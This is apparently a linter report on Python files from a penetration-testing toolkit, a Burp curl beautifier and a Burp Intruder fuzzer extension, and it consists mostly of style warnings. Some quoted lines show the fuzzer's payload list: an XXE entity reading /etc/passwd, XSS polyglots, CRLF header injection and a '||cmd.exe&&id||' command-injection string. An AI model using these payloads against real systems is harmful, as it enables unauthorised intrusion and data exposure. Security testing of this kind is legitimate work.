  --> security\penetration-testing-tools\web\burp-curl-beautifier.py:31:1
   |
29 |     'User-Agent':'',
30 |     'Content-Type':"application/x-www-form-urlencoded",
31 |     'Referer':'',
   | ^^^^
32 | }
   |

W191 Indentation contains tabs
  --> security\penetration-testing-tools\web\burp-curl-beautifier.py:35:1
   |
34 | for k, v in superfluous_headers.items():
35 |     val = v
   | ^^^^
36 |     if not val:
37 |         val = "[^']+"
   |

W191 Indentation contains tabs
  --> security\penetration-testing-tools\web\burp-curl-beautifier.py:36:1
   |
34 | for k, v in superfluous_headers.items():
35 |     val = v
36 |     if not val:
   | ^^^^
37 |         val = "[^']+"
38 |     rex = r" -H '" + k + ": " + val + "' "
   |

W191 Indentation contains tabs
  --> security\penetration-testing-tools\web\burp-curl-beautifier.py:37:1
   |
35 |     val = v
36 |     if not val:
37 |         val = "[^']+"
   | ^^^^^^^^
38 |     rex = r" -H '" + k + ": " + val + "' "
39 |     m = re.search(rex, data)
   |

W191 Indentation contains tabs
  --> security\penetration-testing-tools\web\burp-curl-beautifier.py:38:1
   |
36 |     if not val:
37 |         val = "[^']+"
38 |     rex = r" -H '" + k + ": " + val + "' "
   | ^^^^
39 |     m = re.search(rex, data)
40 |     if m:
   |

W191 Indentation contains tabs
  --> security\penetration-testing-tools\web\burp-curl-beautifier.py:39:1
   |
37 |         val = "[^']+"
38 |     rex = r" -H '" + k + ": " + val + "' "
39 |     m = re.search(rex, data)
   | ^^^^
40 |     if m:
41 |         data = re.sub(rex, ' ', data)
   |

W191 Indentation contains tabs
  --> security\penetration-testing-tools\web\burp-curl-beautifier.py:40:1
   |
38 |     rex = r" -H '" + k + ": " + val + "' "
39 |     m = re.search(rex, data)
40 |     if m:
   | ^^^^
41 |         data = re.sub(rex, ' ', data)
   |

W191 Indentation contains tabs
  --> security\penetration-testing-tools\web\burp-curl-beautifier.py:41:1
   |
39 |     m = re.search(rex, data)
40 |     if m:
41 |         data = re.sub(rex, ' ', data)
   | ^^^^^^^^
42 |
43 | data = re.sub(r"'(http[^']+)'$", r'"\1"', data)
   |

W292 No newline at end of file
  --> security\penetration-testing-tools\web\burp-curl-beautifier.py:44:17
   |
43 | data = re.sub(r"'(http[^']+)'$", r'"\1"', data)
44 | xerox.copy(data)
   |                 ^
   |
help: Add trailing newline

F401 [*] `sys` imported but unused
  --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:68:8
   |
66 | import re
67 | import string
68 | import sys
   |        ^^^
69 | import urllib
70 | import xml.dom.minidom
   |
help: Remove unused import: `sys`

F401 [*] `xml.dom.minidom` imported but unused
  --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:70:8
   |
68 | import sys
69 | import urllib
70 | import xml.dom.minidom
   |        ^^^^^^^^^^^^^^^
71 | import xml.etree.ElementTree as ET
72 | import zlib
   |
help: Remove unused import: `xml.dom.minidom`

F401 [*] `java.util.ArrayList` imported but unused
  --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:84:23
   |
82 |     IIntruderPayloadGeneratorFactory,
83 | )
84 | from java.util import ArrayList, List
   |                       ^^^^^^^^^
85 |
86 | VERSION = "0.2-alpha"
   |
help: Remove unused import

F401 [*] `java.util.List` imported but unused
  --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:84:34
   |
82 |     IIntruderPayloadGeneratorFactory,
83 | )
84 | from java.util import ArrayList, List
   |                                  ^^^^
85 |
86 | VERSION = "0.2-alpha"
   |
help: Remove unused import

W605 [*] Invalid escape sequence: `\``
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:215:25
    |
213 |     '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&ΓÇª
214 |     '\';alert(0)//\\\';alert(1)//";alert(2)//\\";alert(3)//--></SCRIPT>">\'><SCRIPT>alert(4)</SCRIPT>=&{}");}alert(6);function xss(){ΓÇª
215 |     "jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert(666666) )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sΓÇª
    |                         ^^
216 |     "\x0d\x0aCC: example@gmail.com\x0d\x0aLocation: www.google.com",
217 |     "||cmd.exe&&id||",
    |
help: Add backslash to escape sequence

W605 [*] Invalid escape sequence: `\&`
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:224:6
    |
222 |     "[']",
223 |     '"blah',
224 |     "\&apos;",
    |      ^^
225 |     "\\'",
226 |     "\\0",
    |
help: Use a raw string literal

N806 Variable `nonBinary` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:367:13
    |
365 |         @staticmethod
366 |         def isBinaryData(data):
367 |             nonBinary = 0
    |             ^^^^^^^^^
368 |             percOfBinaryToAssume = 0.10
    |

N806 Variable `percOfBinaryToAssume` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:368:13
    |
366 |         def isBinaryData(data):
367 |             nonBinary = 0
368 |             percOfBinaryToAssume = 0.10
    |             ^^^^^^^^^^^^^^^^^^^^
369 |
370 |             for d in data:
    |

SIM114 [*] Combine `if` branches using logical `or` operator
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:372:17
    |
370 |               for d in data:
371 |                   c = ord(d)
372 | /                 if c in (10, 13):
373 | |                     nonBinary += 1
374 | |                 elif c >= 0x20 and c <= 0x7F:
375 | |                     nonBinary += 1
    | |__________________________________^
376 |
377 |               binary = len(data) - nonBinary
    |
help: Combine `if` branches

N806 Variable `nonBinary` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:373:21
    |
371 |                 c = ord(d)
372 |                 if c in (10, 13):
373 |                     nonBinary += 1
    |                     ^^^^^^^^^
374 |                 elif c >= 0x20 and c <= 0x7F:
375 |                     nonBinary += 1
    |

N806 Variable `nonBinary` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:375:21
    |
373 |                     nonBinary += 1
374 |                 elif c >= 0x20 and c <= 0x7F:
375 |                     nonBinary += 1
    |                     ^^^^^^^^^
376 |
377 |             binary = len(data) - nonBinary
    |

SIM103 Return the condition `data` directly
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:402:13
    |
401 |           def check(self, data):
402 | /             if not data:
403 | |                 return False
404 | |             return True
    | |_______________________^
405 |
406 |           def encode(self, data):
    |
help: Replace with `return data`

SIM103 Return the condition `bool(re.search(r"(?:%[0-9a-f]{2})+", data, re.I))` directly
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:422:13
    |
420 |                   return True
421 |
422 | /             if re.search(r"(?:%[0-9a-f]{2})+", data, re.I):
423 | |                 return True
424 | |
425 | |             return False
    | |________________________^
426 |
427 |           def encode(self, data):
    |
help: Replace with `return bool(re.search(r"(?:%[0-9a-f]{2})+", data, re.I))`

SIM103 Return the condition `bool(m)` directly
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:439:13
    |
437 |           def check(self, data):
438 |               m = re.match(r"^[0-9a-f]+$", data, re.I)
439 | /             if m:
440 | |                 return True
441 | |             return False
    | |________________________^
442 |
443 |           def encode(self, data):
    |
help: Replace with `return bool(m)`

W605 [*] Invalid escape sequence: `\/`
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:457:41
    |
455 |                 if base64.b64encode(base64.b64decode(data)) == data:
456 |                     m = re.match(
457 |                         "^(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{4})$",
    |                                         ^^
458 |                         data,
459 |                         re.I,
    |
help: Use a raw string literal

W605 [*] Invalid escape sequence: `\/`
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:457:63
    |
455 |                 if base64.b64encode(base64.b64decode(data)) == data:
456 |                     m = re.match(
457 |                         "^(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{4})$",
    |                                                               ^^
458 |                         data,
459 |                         re.I,
    |
help: Use a raw string literal

W605 [*] Invalid escape sequence: `\/`
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:457:83
    |
455 |                 if base64.b64encode(base64.b64decode(data)) == data:
456 |                     m = re.match(
457 |                         "^(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{4})$",
    |                                                                                   ^^
458 |                         data,
459 |                         re.I,
    |
help: Use a raw string literal

W605 [*] Invalid escape sequence: `\/`
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:457:102
    |
455 |                 if base64.b64encode(base64.b64decode(data)) == data:
456 |                     m = re.match(
457 |                         "^(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{4})$",
    |                                                                                                      ^^
458 |                         data,
459 |                         re.I,
    |
help: Use a raw string literal

SIM103 Return the condition `bool(m)` directly
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:461:21
    |
459 |                           re.I,
460 |                       )
461 | /                     if m:
462 | |                         return True
463 | |                     return False
    | |________________________________^
464 |               except:
465 |                   pass
    |
help: Replace with `return bool(m)`

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:464:13
    |
462 |                         return True
463 |                     return False
464 |             except:
    |             ^^^^^^
465 |                 pass
466 |             return False
    |

W605 [*] Invalid escape sequence: `\-`
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:482:40
    |
480 |                 if base64.urlsafe_b64encode(base64.urlsafe_b64decode(data)) == data:
481 |                     m = re.match(
482 |                         "^(?:[A-Za-z0-9\-_]{4})*(?:[A-Za-z0-9\-_]{2}==|[A-Za-z0-9\-_]{3}=|[A-Za-z0-9\-_]{4})$",
    |                                        ^^
483 |                         data,
484 |                         re.I,
    |
help: Use a raw string literal

W605 [*] Invalid escape sequence: `\-`
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:482:62
    |
480 |                 if base64.urlsafe_b64encode(base64.urlsafe_b64decode(data)) == data:
481 |                     m = re.match(
482 |                         "^(?:[A-Za-z0-9\-_]{4})*(?:[A-Za-z0-9\-_]{2}==|[A-Za-z0-9\-_]{3}=|[A-Za-z0-9\-_]{4})$",
    |                                                              ^^
483 |                         data,
484 |                         re.I,
    |
help: Use a raw string literal

W605 [*] Invalid escape sequence: `\-`
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:482:82
    |
480 |                 if base64.urlsafe_b64encode(base64.urlsafe_b64decode(data)) == data:
481 |                     m = re.match(
482 |                         "^(?:[A-Za-z0-9\-_]{4})*(?:[A-Za-z0-9\-_]{2}==|[A-Za-z0-9\-_]{3}=|[A-Za-z0-9\-_]{4})$",
    |                                                                                  ^^
483 |                         data,
484 |                         re.I,
    |
help: Use a raw string literal

W605 [*] Invalid escape sequence: `\-`
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:482:101
    |
480 |                 if base64.urlsafe_b64encode(base64.urlsafe_b64decode(data)) == data:
481 |                     m = re.match(
482 |                         "^(?:[A-Za-z0-9\-_]{4})*(?:[A-Za-z0-9\-_]{2}==|[A-Za-z0-9\-_]{3}=|[A-Za-z0-9\-_]{4})$",
    |                                                                                                     ^^
483 |                         data,
484 |                         re.I,
    |
help: Use a raw string literal

SIM103 Return the condition `bool(m)` directly
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:486:21
    |
484 |                           re.I,
485 |                       )
486 | /                     if m:
487 | |                         return True
488 | |                     return False
    | |________________________________^
489 |               except:
490 |                   pass
    |
help: Replace with `return bool(m)`

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:489:13
    |
487 |                         return True
488 |                     return False
489 |             except:
    |             ^^^^^^
490 |                 pass
491 |             return False
    |

F821 Undefined name `JWTEncoder`
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:513:37
    |
512 |         def encode(self, data):
513 |             return jwt.encode(data, JWTEncoder.secret)
    |                                     ^^^^^^^^^^
514 |
515 |         def decode(self, data):
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:529:13
    |
527 |                 if zlib.compress(zlib.decompress(data)) == data:
528 |                     return True
529 |             except:
    |             ^^^^^^
530 |                 pass
531 |             return False
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:571:16
    |
569 |     def verifyEncodings(self, encodings):
570 |         for encoder in encodings:
571 |             if type(encoder) == str:
    |                ^^^^^^^^^^^^^^^^^^^^
572 |                 if not encoder in self.encodersMap.keys():
573 |                     raise Exception("Passed unknown encoder's name.")
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:572:24
    |
570 |         for encoder in encodings:
571 |             if type(encoder) == str:
572 |                 if not encoder in self.encodersMap.keys():
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
573 |                     raise Exception("Passed unknown encoder's name.")
574 |             elif not issubclass(ReEncoder.Encoder, encoder):
    |
help: Remove `.keys()`

E713 [*] Test for membership should be `not in`
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:572:24
    |
570 |         for encoder in encodings:
571 |             if type(encoder) == str:
572 |                 if not encoder in self.encodersMap.keys():
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
573 |                     raise Exception("Passed unknown encoder's name.")
574 |             elif not issubclass(ReEncoder.Encoder, encoder):
    |
help: Convert to `not in`

N806 Variable `maxSteps` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:579:9
    |
577 |     def generateEncodingTree(self, data):
578 |         step = 0
579 |         maxSteps = len(self.encoders) * ReEncoder.MaxEncodingDepth
    |         ^^^^^^^^
580 |
581 |         peeledBefore = 0
    |

N806 Variable `peeledBefore` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:581:9
    |
579 |         maxSteps = len(self.encoders) * ReEncoder.MaxEncodingDepth
580 |
581 |         peeledBefore = 0
    |         ^^^^^^^^^^^^
582 |         peeledOff = 0
583 |         currData = data
    |

N806 Variable `peeledOff` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:582:9
    |
581 |         peeledBefore = 0
582 |         peeledOff = 0
    |         ^^^^^^^^^
583 |         currData = data
    |

N806 Variable `currData` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:583:9
    |
581 |         peeledBefore = 0
582 |         peeledOff = 0
583 |         currData = data
    |         ^^^^^^^^
584 |
585 |         while step < maxSteps:
    |

N806 Variable `peeledBefore` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:586:13
    |
585 |         while step < maxSteps:
586 |             peeledBefore = peeledOff
    |             ^^^^^^^^^^^^
587 |             for encoder in self.encoders:
588 |                 step += 1
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:591:21
    |
590 |                   ReEncoder.log(
591 | /                     '[.] Trying: {} (peeled off: {}). Current form: "{}"'.format(
592 | |                         encoder.name(), peeledOff, currData
593 | |                     )
    | |_____________________^
594 |                   )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:604:29
    |
602 |                       ):
603 |                           ReEncoder.log(
604 | /                             "[.] Unclear situation whether input ({}) is Base64 encoded. Branching.".format(
605 | |                                 currData
606 | |                             )
    | |_____________________________^
607 |                           )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:615:29
    |
613 |                       ):
614 |                           ReEncoder.log(
615 | /                             "[.] Unclear situation whether input ({}) is Hex encoded. Branching.".format(
616 | |                                 currData
617 | |                             )
    | |_____________________________^
618 |                           )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:622:35
    |
620 |                         yield ("None", currData, True)
621 |
622 |                     ReEncoder.log("[+] Detected encoder: {}".format(encoder.name()))
    |                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
623 |
624 |                     currData = encoder.decode(currData)
    |
help: Convert to f-string

N806 Variable `currData` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:624:21
    |
622 |                     ReEncoder.log("[+] Detected encoder: {}".format(encoder.name()))
623 |
624 |                     currData = encoder.decode(currData)
    |                     ^^^^^^^^
625 |                     yield (encoder.name(), currData, False)
    |

N806 Variable `peeledOff` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:627:21
    |
625 |                     yield (encoder.name(), currData, False)
626 |
627 |                     peeledOff += 1
    |                     ^^^^^^^^^
628 |
629 |                     break
    |

C416 Unnecessary list comprehension (rewrite using `list()`)
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:636:13
    |
634 |     def formEncodingCandidates(self, root):
635 |         iters = [
636 |             [node for node in children]
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^
637 |             for children in anytree.LevelOrderGroupIter(root)
638 |         ]
    |
help: Rewrite using `list()`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:647:17
    |
646 |               ReEncoder.log(
647 | /                 '[.] Candidate for best decode using {}: "{}"...'.format(
648 | |                     name, decoded[:20]
649 | |                 )
    | |_________________^
650 |               )
    |
help: Convert to f-string

N806 Variable `printableEncodings` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:680:10
    |
679 |     def evaluateEncodingTree(self, root):
680 |         (printableEncodings, printableCandidate) = self.evaluateEncodingTreePicker(
    |          ^^^^^^^^^^^^^^^^^^
681 |             root, False
682 |         )
    |

N806 Variable `printableCandidate` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:680:30
    |
679 |     def evaluateEncodingTree(self, root):
680 |         (printableEncodings, printableCandidate) = self.evaluateEncodingTreePicker(
    |                              ^^^^^^^^^^^^^^^^^^
681 |             root, False
682 |         )
    |

N806 Variable `binaryEncodings` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:683:10
    |
681 |             root, False
682 |         )
683 |         (binaryEncodings, binaryCandidate) = self.evaluateEncodingTreePicker(root, True)
    |          ^^^^^^^^^^^^^^^
684 |
685 |         if self.preferredOutputFormat == ReEncoder.PREFER_TEXT:
    |

N806 Variable `binaryCandidate` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:683:27
    |
681 |             root, False
682 |         )
683 |         (binaryEncodings, binaryCandidate) = self.evaluateEncodingTreePicker(root, True)
    |                           ^^^^^^^^^^^^^^^
684 |
685 |         if self.preferredOutputFormat == ReEncoder.PREFER_TEXT:
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:698:13
    |
696 |           ReEncoder.log("\n---------------------------------------")
697 |           ReEncoder.log(
698 | /             "[>] Winning printable encoding path scored: {} points.".format(
699 | |                 printableCandidate[2]
700 | |             )
    | |_____________^
701 |           )
702 |           ReEncoder.log(
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:703:13
    |
701 |           )
702 |           ReEncoder.log(
703 | /             "[>] Winning binary encoding path scored: {} points.".format(
704 | |                 binaryCandidate[2]
705 | |             )
    | |_____________^
706 |           )
    |
help: Convert to f-string

N803 Argument name `preferBinary` should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:716:48
    |
714 |         return binaryEncodings
715 |
716 |     def evaluateEncodingTreePicker(self, root, preferBinary):
    |                                                ^^^^^^^^^^^^
717 |         candidates = self._evaluateEncodingTreeWorker(root, preferBinary)
    |

N806 Variable `maxCandidate` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:719:9
    |
717 |         candidates = self._evaluateEncodingTreeWorker(root, preferBinary)
718 |
719 |         maxCandidate = 0
    |         ^^^^^^^^^^^^
720 |
721 |         for i in range(len(candidates)):
    |

F841 Local variable `name` is assigned to but never used
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:724:13
    |
722 |             candidate = candidates[i]
723 |
724 |             name = candidate[0]
    |             ^^^^
725 |             decoded = candidate[1]
726 |             points = float(candidate[2])
    |
help: Remove assignment to unused variable `name`

F841 Local variable `decoded` is assigned to but never used
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:725:13
    |
724 |             name = candidate[0]
725 |             decoded = candidate[1]
    |             ^^^^^^^
726 |             points = float(candidate[2])
    |
help: Remove assignment to unused variable `decoded`

N806 Variable `maxCandidate` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:729:17
    |
728 |             if points > candidates[maxCandidate][2]:
729 |                 maxCandidate = i
    |                 ^^^^^^^^^^^^
730 |
731 |         winningCandidate = candidates[maxCandidate]
    |

N806 Variable `winningCandidate` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:731:9
    |
729 |                 maxCandidate = i
730 |
731 |         winningCandidate = candidates[maxCandidate]
    |         ^^^^^^^^^^^^^^^^
732 |         winningPaths = anytree.search.findall_by_attr(
733 |             root, name="decoded", value=winningCandidate[1]
    |

N806 Variable `winningPaths` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:732:9
    |
731 |         winningCandidate = candidates[maxCandidate]
732 |         winningPaths = anytree.search.findall_by_attr(
    |         ^^^^^^^^^^^^
733 |             root, name="decoded", value=winningCandidate[1]
734 |         )
    |

N806 Variable `winningPath` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:737:9
    |
736 |         ReEncoder.log("[?] Other equally good candidate paths:\n" + str(winningPaths))
737 |         winningPath = winningPaths[0]
    |         ^^^^^^^^^^^
738 |
739 |         preferred = "printable"
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:744:13
    |
743 |           ReEncoder.log(
744 | /             "[+] Winning decode path for {} output is:\n{}".format(
745 | |                 preferred, str(winningPath)
746 | |             )
    | |_____________^
747 |           )
    |
help: Convert to f-string

N803 Argument name `preferBinary` should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:752:49
    |
750 |         return (encodings, winningCandidate)
751 |
752 |     def _evaluateEncodingTreeWorker(self, root, preferBinary=False):
    |                                                 ^^^^^^^^^^^^^^^^^^
753 |         weights = {
754 |             "unreadableChars": 0.0,
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:778:17
    |
777 |               ReEncoder.log(
778 | /                 '[=] Evaluating candidate: {} (entropy: {}, data: "{}")'.format(
779 | |                     name, entropy, decoded
780 | |                 )
    | |_________________^
781 |               )
    |
help: Convert to f-string

N806 Variable `printablePoints` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:784:13
    |
783 |             # Step 1: Adding points for printable percentage.
784 |             printablePoints = float(weights["printableChars"]) * (
    |             ^^^^^^^^^^^^^^^
785 |                 float(printables) / float(len(decoded))
786 |             )
    |

N806 Variable `nonPrintablePoints` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:787:13
    |
785 |                 float(printables) / float(len(decoded))
786 |             )
787 |             nonPrintablePoints = float(weights["unreadableChars"]) * (
    |             ^^^^^^^^^^^^^^^^^^
788 |                 float(nonprintables) / float(len(decoded))
789 |             )
    |

N806 Variable `entropyPoints` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:799:17
    |
797 |             ):
798 |                 ReEncoder.log("\tAdding fine for being base64")
799 |                 entropyPoints = entropy * (weights["entropyScore"] * 0.666666)
    |                 ^^^^^^^^^^^^^
800 |                 lengthPoints = float(len(decoded)) * (weights["length"] * 0.666666)
801 |             else:
    |

N806 Variable `lengthPoints` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:800:17
    |
798 |                 ReEncoder.log("\tAdding fine for being base64")
799 |                 entropyPoints = entropy * (weights["entropyScore"] * 0.666666)
800 |                 lengthPoints = float(len(decoded)) * (weights["length"] * 0.666666)
    |                 ^^^^^^^^^^^^
801 |             else:
802 |                 entropyPoints = entropy * weights["entropyScore"]
    |

N806 Variable `entropyPoints` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:802:17
    |
800 |                 lengthPoints = float(len(decoded)) * (weights["length"] * 0.666666)
801 |             else:
802 |                 entropyPoints = entropy * weights["entropyScore"]
    |                 ^^^^^^^^^^^^^
803 |                 lengthPoints = float(len(decoded)) * weights["length"]
    |

N806 Variable `lengthPoints` in function should be lowercase
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:803:17
    |
801 |             else:
802 |                 entropyPoints = entropy * weights["entropyScore"]
803 |                 lengthPoints = float(len(decoded)) * weights["length"]
    |                 ^^^^^^^^^^^^
804 |
805 |             if printables > nonprintables:
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:808:21
    |
806 |                 ReEncoder.log("More printable chars than binary ones.")
807 |                 ReEncoder.log(
808 |                     "\tAdding {} points for printable entropy.".format(entropyPoints)
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
809 |                 )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:812:21
    |
811 |                   ReEncoder.log(
812 | /                     "\tAdding {} points for printable characters.".format(
813 | |                         printablePoints
814 | |                     )
    | |_____________________^
815 |                   )
816 |                   points += printablePoints
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:820:21
    |
818 |                 ReEncoder.log("More binary chars than printable ones.")
819 |                 ReEncoder.log(
820 |                     "\tAdding {} points for binary entropy.".format(entropyPoints)
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
821 |                 )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:824:21
    |
823 |                   ReEncoder.log(
824 | /                     "\tAdding {} points for binary characters.".format(
825 | |                         nonPrintablePoints
826 | |                     )
    | |_____________________^
827 |                   )
828 |                   points += nonPrintablePoints
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:833:27
    |
832 |             # Step 4: Add points for length
833 |             ReEncoder.log("\tAdding {} points for length.".format(lengthPoints))
    |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
834 |             points += lengthPoints
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\burpContextAwareFuzzer\burpContextAwareFuzzer.py:836:27
    |
834 |             points += lengthPoints
835 |
836 |             ReEncoder.log("\tScored in total: {} points.".format(points))
    |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
837 |             candidates[i][2] = points
    |
help: Convert to f-string

